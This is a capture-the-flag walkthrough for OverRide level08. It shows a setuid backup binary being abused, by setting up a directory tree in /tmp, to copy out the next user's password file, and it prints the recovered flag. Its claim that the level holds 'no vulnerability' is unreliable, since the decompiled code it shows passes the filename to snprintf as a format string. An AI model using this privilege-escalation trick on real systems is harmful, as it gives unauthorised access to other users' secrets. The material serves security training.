# Level08 Walkthrough
## Initial Analysis
### 1. Examine the Binary
```bash
level08@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level08 level08   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level08 level08  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level09 users   7500 Sep 10  2016 level08
-rw-r--r--+ 1 level08 level08   41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08  675 Sep 10  2016 .profile
```
**Key observations:**

setuid and setgid binary (s flags in permissions)

Owned by level09 user

When executed, runs with level09 privileges

### 2. Test Basic Execution
```bash
level08@OverRide:~$ ./level08
Usage: ./level08 filename

level08@OverRide:~$ ./level08 test
ERROR: Failed to open ./backups/test
```
**Observations:**

Program takes a filename as argument

Tries to read the file and create a backup in ./backups/ directory

Requires the ./backups/ directory to exist

## Reverse Engineering
### 3. Function Analysis
```bash
(gdb) info functions
All defined functions:
0x00000000004006f0  strcpy@plt
0x0000000000400700  write@plt
0x0000000000400710  fclose@plt
0x0000000000400720  __stack_chk_fail@plt
0x0000000000400730  printf@plt
0x0000000000400740  snprintf@plt
0x0000000000400750  strncat@plt
0x0000000000400760  fgetc@plt
0x0000000000400770  close@plt
0x0000000000400780  strcspn@plt
0x00000000004007a0  fprintf@plt
0x00000000004007b0  open@plt
0x00000000004007c0  fopen@plt
0x00000000004007d0  exit@plt
0x00000000004008c4  log_wrapper
0x00000000004009f0  main
```
### 4. Decompiled Source Code
After analyzing the assembly, the program does:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void log_wrapper(FILE *log, char *msg, char *filename)
{
    char buffer[264];
    
    strcpy(buffer, msg);
    snprintf(buffer + strlen(buffer), 254 - strlen(buffer), filename);
    buffer[strcspn(buffer, "\n")] = 0;
    fprintf(log, "LOG: %s\n", buffer);
}

int main(int argc, char **argv)
{
    FILE *log;
    FILE *file;
    int fd;
    char c;
    char dest[104];
    
    if (argc != 2) {
        printf("Usage: %s filename\n", argv[0]);
        return 1;
    }
    
    log = fopen("./backups/.log", "w");
    if (!log) {
        printf("ERROR: Failed to open ./backups/.log\n");
        exit(1);
    }
    
    log_wrapper(log, "Starting back up: ", argv[1]);
    
    file = fopen(argv[1], "r");
    if (!file) {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(1);
    }
    
    strcpy(dest, "./backups/");
    strncat(dest, argv[1], 99 - strlen(dest));
    
    fd = open(dest, O_CREAT | O_RDWR | O_TRUNC, 0644);
    if (fd < 0) {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }
    
    while ((c = fgetc(file)) != EOF)
        write(fd, &c, 1);
    
    log_wrapper(log, "Finished back up ", argv[1]);
    fclose(file);
    close(fd);
    return 0;
}
```
### 5. Understanding the Program
The program:

Takes a filename as argument

Opens a log file at ./backups/.log

Copies the input file to ./backups/<filename>

Logs the operation

**Key insight:** The program creates a backup of any file we specify, but only if the ./backups/ directory exists and we have write permissions.

## The Vulnerability - No Vulnerability!
This level doesn't contain a traditional vulnerability like buffer overflow or format string. Instead, it's about using the program's intended functionality to read a file we normally couldn't access.

The program runs with level09 privileges (setuid). So when it reads a file and writes it to ./backups/, it does so with elevated permissions.

### 6. The Problem
We want to read /home/users/level09/.pass, but:

We don't have direct read permissions as level08

The program can read it because it runs as level09

The program writes the backup to ./backups/ in our current directory

But ./backups/ doesn't exist in our home directory, and we can't create it there.

### 7. The Solution
We can create the ./backups/ directory in /tmp/ where we have full permissions!

```bash
level08@OverRide:~$ cd /tmp/
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
Now we can run the program from /tmp/ and use the relative path:
```
```bash
level08@OverRide:/tmp$ ~/level08 ~level09/.pass
The program will:

Open ~level09/.pass (as level09 user)

Create /tmp/backups/home/users/level09/.pass

Copy the content
```

### 8. Getting the Flag
```bash
level08@OverRide:/tmp$ ~/level08 ~level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
**Exploitation Technique:**
Create directory structure in /tmp/ matching the backup path

Run the program from /tmp/ with the target file as argument

Read the backup created by the privileged process

Retrieve the flag

**Key Learning Points:**
Not all levels require buffer overflows - sometimes you just need to use the program correctly

Setuid binaries inherit the owner's permissions, not the runner's

Relative paths can be manipulated by changing the working directory

Directory permissions matter - use /tmp/ when you can't write elsewhere

Program functionality can be exploited without memory corruption
